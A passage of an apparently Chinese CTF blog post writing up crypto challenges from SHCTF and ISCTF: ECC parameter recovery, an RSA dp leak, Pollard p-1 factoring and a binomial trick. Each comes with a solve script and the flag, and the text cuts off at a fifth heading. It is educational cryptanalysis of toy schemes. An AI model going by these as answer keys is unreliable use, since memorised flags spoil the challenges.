    <link href="/2024/10/31/Crypto-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/31/Crypto-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto（部分赛题复现）"><a href="#Crypto（部分赛题复现）" class="headerlink" title="Crypto（部分赛题复现）"></a>Crypto（部分赛题复现）</h1><h3 id="一、ECC"><a href="#一、ECC" class="headerlink" title="一、ECC"></a>一、ECC</h3><p><strong>题目</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">b&#x27;SHCTF&#123;&#x27;</span>)<br><br>m = next_prime(bytes_to_long(flag))<br>p = getPrime(<span class="hljs-number">512</span>)<br>a,b = getPrime(<span class="hljs-number">128</span>),getPrime(<span class="hljs-number">128</span>)<br>E = EllipticCurve(Zmod(p),[a,b])<br>k = getPrime(<span class="hljs-number">256</span>)<br>A1 = E.random_point()<br>A2 = A1*k<br>M = E.lift_x(m)<br>C = M+A2<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k = &#x27;</span>,k)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A1 = &#x27;</span>,A1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C = &#x27;</span>,C)<br></code></pre></td></tr></table></figure><p>分析题目，根据椭圆曲线$y^2&#x3D;x^3+ax+b(mod p)$,<br>易得<br>$y_1^2&#x3D;x_1^3+ax_1+b(mod p)$<br>$y_2^2&#x3D;x_2^3+ax_2+b(mod p)$</p><p>因此 $y_1^2-y_2^2&#x3D;x_1^3-x_2^3+a(x_1-x_2) (mod p)$<br>可以得到</p><ul><li><p>$a&#x3D;((y_1^2-y_2^2)-(x_1^3-x_2^3))*(x_1-x_2)^{-1}(mod p)$</p></li><li><p>$b&#x3D;y_1^2-x_1^3-ax_1$</p></li></ul><p><em>代码实现如下：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679</span><br>k = <span class="hljs-number">73771953838487511457389800773038323262861649769228176071578897500004883270121</span><br><br><span class="hljs-comment"># 椭圆曲线上的点 A1 的坐标</span><br>A1_x = <span class="hljs-number">5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791</span><br>A1_y = <span class="hljs-number">4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709</span><br><br><span class="hljs-comment"># 椭圆曲线上的点 C 的坐标</span><br>C_x = <span class="hljs-number">2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276</span><br>C_y = <span class="hljs-number">6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025</span><br><br><span class="hljs-comment"># 计算椭圆曲线的系数 a,b</span><br>a = (((A1_y**<span class="hljs-number">2</span> - C_y**<span class="hljs-number">2</span>) - (A1_x**<span class="hljs-number">3</span> - C_x**<span class="hljs-number">3</span>)) * inverse_mod(A1_x - C_x, p)) % p<br>b = (A1_y**<span class="hljs-number">2</span> - (A1_x**<span class="hljs-number">3</span> + a * A1_x)) % p<br><br><span class="hljs-comment"># 椭圆曲线 E</span><br>E = EllipticCurve(Zmod(p), [a, b])<br><span class="hljs-comment"># 得到椭圆曲线上的点 A1 和 C</span><br>A1 = E(A1_x, A1_y)<br>C = E(C_x, C_y)<br><br><span class="hljs-comment"># 计算 M，M 是 C 和 A1 的 k 倍之差</span><br>M = C - A1 * k<br><br>M_x, M_y = M.xy()<br>M_x = <span class="hljs-built_in">int</span>(M_x)  <span class="hljs-comment"># 确保 M_x 是整数</span><br>k = <span class="hljs-number">0</span>  <br><br><span class="hljs-comment"># 爆破，直到找到合适的 k</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 计算 M_x + k，并转换为字节</span><br>    flag = (M_x + k).to_bytes((M_x + k).bit_length() // <span class="hljs-number">8</span> + <span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-keyword">if</span> flag[-<span class="hljs-number">1</span>] == <span class="hljs-string">b&#x27;&#125;&#x27;</span>[<span class="hljs-number">0</span>]:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    k += <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>最后得出flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;SHCTF&#123;fo1und_adm1n_1st112&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="二、Worde"><a href="#二、Worde" class="headerlink" title="二、Worde"></a>二、Worde</h2><p><strong>题目</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> enc <span class="hljs-keyword">import</span> flag<br><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = getPrime(<span class="hljs-number">200</span>)<br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>dp = d % (p-<span class="hljs-number">1</span>)<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;dp = <span class="hljs-subst">&#123;dp&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 109107602100083925434534585854846831236367603422316141347264137431302883470878923089749415207692012162155876778433717629342677316345731989945596067366116672567736273807718413809647914537764235761542424897238828392953295052578070312924153469401927457894377311164918422725712644346523111884028669119193975313887</span><br><span class="hljs-string">c = 12365023456688645580386013142401018678669277172751038338862050435558830037797597611468398293100628165715843800273910908523113026689604063358765532741066964819435916168186673401044725950148852461706560086575130200892491873160148840462376185674368155136548141795152470696307075032455110914362528191482417145054</span><br><span class="hljs-string">e = 1110502004037199148392049197465263263258201603154804199229233</span><br><span class="hljs-string">dp = 3275908895382252717938319219921393159589684865527587914026986407331495145759978971843598067552610402795251010991143945338216738101191449912695396060306987</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析</strong></p><p>$d_p&#x3D;d mod(p-1)$</p><p>$ed&#x3D;1 mod(p-1)(q-1)$</p><p>$m^{ed_p} modn&#x3D;m^{ed mod(p-1)}modn&#x3D;m^{edmod(p-1)}modp$</p><p>所以$ m^{ed_p}modn&#x3D;m^{1+k(p-1)}modp$</p><p>由费马小定理得</p><p>$m^{1+k(p-1)}&#x3D;mmodp$</p><p>$m^{ed_p}modn&#x3D;mmodp$</p><p>即$m^{ed_p}modn-m&#x3D;0modp$</p><p>又因为    $n&#x3D;p*q$</p><p>所以，</p><p>$p&#x3D;gcd(m^{ed_p}modn-m,n)$</p><p>$q&#x3D;n&#x2F;p$</p><p>由于p，q的值不会随m的值的变化而变化，因此先取一个简单的m值算出p，q</p><p>这里取m&#x3D;3,具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">109107602100083925434534585854846831236367603422316141347264137431302883470878923089749415207692012162155876778433717629342677316345731989945596067366116672567736273807718413809647914537764235761542424897238828392953295052578070312924153469401927457894377311164918422725712644346523111884028669119193975313887</span><br>c = <span class="hljs-number">12365023456688645580386013142401018678669277172751038338862050435558830037797597611468398293100628165715843800273910908523113026689604063358765532741066964819435916168186673401044725950148852461706560086575130200892491873160148840462376185674368155136548141795152470696307075032455110914362528191482417145054</span><br>e = <span class="hljs-number">1110502004037199148392049197465263263258201603154804199229233</span><br>dp = <span class="hljs-number">3275908895382252717938319219921393159589684865527587914026986407331495145759978971843598067552610402795251010991143945338216738101191449912695396060306987</span><br><br>p=gmpy2.gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>,e*dp,n)-<span class="hljs-number">3</span>,n)<br>q=n // p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>得出flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">SHCTF</span><span class="hljs-template-variable">&#123;W0RD_E_You_Dian_d4_39ac80&#125;</span><br></code></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="三、魔鬼的步伐"><a href="#三、魔鬼的步伐" class="headerlink" title="三、魔鬼的步伐"></a>三、魔鬼的步伐</h2><p><strong>题目</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> enc <span class="hljs-keyword">import</span> flag<br><br>m = bytes_to_long(flag)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_primes</span>(<span class="hljs-params">limit</span>):<br>    primes = []<br>    is_prime = [<span class="hljs-literal">True</span>] * (limit + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, limit + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> is_prime[num]:<br>            primes.append(num)<br>            <span class="hljs-keyword">for</span> multiple <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num * num, limit + <span class="hljs-number">1</span>, num):<br>                is_prime[multiple] = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> primes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_Prime</span>(<span class="hljs-params">bits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> n.bit_length() &lt; bits:<br>            n *= choice(primes)<br>        <span class="hljs-keyword">if</span> isPrime(n + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">65537</span><br>primes = get_primes(e)<br>p = get_Prime(<span class="hljs-number">512</span>)<br>q = get_Prime(<span class="hljs-number">512</span>)<br>n = p*q<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 4186638789266977215701176406902225153580897798738374778190546920953456120773405529907877295436545488469674635531209549868315266718331642076467662180105755639770292506252529987461772914357288415820521682440518534463618953638844660234376343358577530665662965586577666423222977193832113032528182580888600345392172267</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 1101497471412301437262774092373565647672283526174670758698538912172368368818345084954023566146183938314237997217377433629432867021863253208574722128961878717486680977557664225793339730281222164389006116794870197114163633751309928211749128540642890687695741098247036592774972659188774127813915341533193950474979408</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>由题目暗示和题目代码可以看出，p-1 是光滑数</p><p>$p-1&#x3D;p_1p_2…p_n(p_i&lt;&#x3D;B)$</p><p>所以$p-1|B!$</p><p>即$B!&#x3D;k(p-1)$</p><p>由费马小定理得：$a^{k(p-1)}&#x3D;1modp$</p><p>$&#x3D;&gt;a^{B!}&#x3D;1modp$</p><p>可以得知$p&#x3D;gcd(a^{B!}-1,n)$</p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">4186638789266977215701176406902225153580897798738374778190546920953456120773405529907877295436545488469674635531209549868315266718331642076467662180105755639770292506252529987461772914357288415820521682440518534463618953638844660234376343358577530665662965586577666423222977193832113032528182580888600345392172267</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">1101497471412301437262774092373565647672283526174670758698538912172368368818345084954023566146183938314237997217377433629432867021863253208574722128961878717486680977557664225793339730281222164389006116794870197114163633751309928211749128540642890687695741098247036592774972659188774127813915341533193950474979408</span><br><br>a = <span class="hljs-number">2</span><br>k = <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    a = <span class="hljs-built_in">pow</span>(a, k, n)<br>    p = gmpy2.gcd(a-<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p != n:<br>        q = n // p<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>        <span class="hljs-keyword">break</span><br>    k += <span class="hljs-number">1</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>m=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><p>得到flag如下：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">SHCTF&#123;<span class="hljs-number">1</span>Rlc<span class="hljs-number">7</span>iO<span class="hljs-symbol">n_is_THE_d3</span>vils_<span class="hljs-number">5</span>TeP_<span class="hljs-name">G3</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><h2 id="四、小鲨鱼的方程"><a href="#四、小鲨鱼的方程" class="headerlink" title="四、小鲨鱼的方程"></a>四、小鲨鱼的方程</h2><p><strong>题目</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Cryptodome.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> uuid<br>flag1=<span class="hljs-string">&#x27;ISCTF&#123;&#x27;</span>+<span class="hljs-built_in">str</span>(uuid.uuid4())+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><br>m1=bytes_to_long(flag1.encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_p</span>():<br>    BITS = <span class="hljs-number">256</span><br>    bits = <span class="hljs-number">777</span><br>    oder = <span class="hljs-number">4</span><br>    a = randint(<span class="hljs-number">1</span> &lt;&lt; bits, <span class="hljs-number">1</span> &lt;&lt; bits + <span class="hljs-number">1</span>)   <span class="hljs-comment">#a是777位随机数</span><br>    p=getPrime(BITS)      <span class="hljs-comment">#p是256位素数</span><br>    p1 = p**oder+a        <span class="hljs-comment">#p1=p*4+a</span><br>    <span class="hljs-keyword">return</span> p,p1<br>p,p1=get_p()<br>s=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br>n=p*q**<span class="hljs-number">4</span><br>e=<span class="hljs-number">65537</span><br>c1=<span class="hljs-built_in">pow</span>(s,e,n)     <span class="hljs-comment">#求s</span><br><span class="hljs-comment">#d=invert(e,(p-1)(q**4-q**3))</span><br><span class="hljs-comment">#s=pow(c1,d,n)</span><br>c=<span class="hljs-built_in">pow</span>(s**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>,m1,s**<span class="hljs-number">5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1=&quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p1 =&quot;</span>,p1)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327</span><br><span class="hljs-string">c = 8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436</span><br><span class="hljs-string">n = 1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111</span><br><span class="hljs-string">p1 = 145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br></code></pre></td></tr></table></figure><p><strong>解答</strong></p><p>p,q容易得到，之后按正常的RSA步骤求出s，之后就是利用s求m</p><p>$\because c&#x3D;pow(s^3+1,m,s^5)$</p><p>$即c&#x3D;(s^3+1)^mmods^5$</p><p>由二项式定理得：</p><p>$(s^3+1)^m&#x3D;C_m^0s^{3m}1^0+C_m^1s^{3(m-1)}1^1…+C_m^{m-1}s^31^{m-1}+C_m^ms^01^m$</p><p>$\therefore (s^3+1)^m&#x3D;C_m^0s^{3m}+C_m^1s^{3(m-1)}…+C_m^{m-1}s^3+C_m^ms^0$</p><p>因为m必定大于2</p><p>$\therefore s^3$前面的数必定是s^5的倍数，可以直接约掉</p><p>$\therefore (s^3+1)^m&#x3D;ms^3+1mods^5$</p><p>$\therefore c&#x3D;ms^3+1mods^5$</p><p>$\because 由于flag的长度可知m&lt;s^2(2048bits)$</p><p>$\therefore c&#x3D;ms^3+1$</p><p>$\therefore m&#x3D;(c-1)&#x2F;(s^3)$</p><p><strong>代码实现如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br>c1= <span class="hljs-number">671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327</span><br>c = <span class="hljs-number">8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436</span><br>n = <span class="hljs-number">1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111</span><br>p1 = <span class="hljs-number">145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553</span><br>e = <span class="hljs-number">65537</span><br><br>p_tmp=gmpy2.iroot(p1,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-comment">#暴力破解p和q</span><br>    q_tmp=n // p_tmp<br>    <span class="hljs-keyword">if</span> n==q_tmp*p_tmp:<br>        p=p_tmp<br>        q=gmpy2.iroot(q_tmp,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">break</span><br>    p_tmp-=<span class="hljs-number">1</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q**<span class="hljs-number">4</span>-q**<span class="hljs-number">3</span>)   <span class="hljs-comment">#欧拉函数</span><br>d=gmpy2.invert(e,phi)<br>s=<span class="hljs-built_in">pow</span>(c1,d,n)<br><span class="hljs-comment">#print(s)</span><br>m=(c-<span class="hljs-number">1</span>)//(s**<span class="hljs-number">3</span>)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><p>运行得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span>&#x27;ISCTF&#123;<span class="hljs-number">8</span>e0ff2de-cd65-<span class="hljs-number">497</span>f-a755-<span class="hljs-number">815154</span>bb5b1f&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="五、蓝鲨的费马"><a href="#五、蓝鲨的费马" class="headerlink" title="五、蓝鲨的费马"></a>五、蓝鲨的费马</h2><p><strong>题目：</strong></p><figure 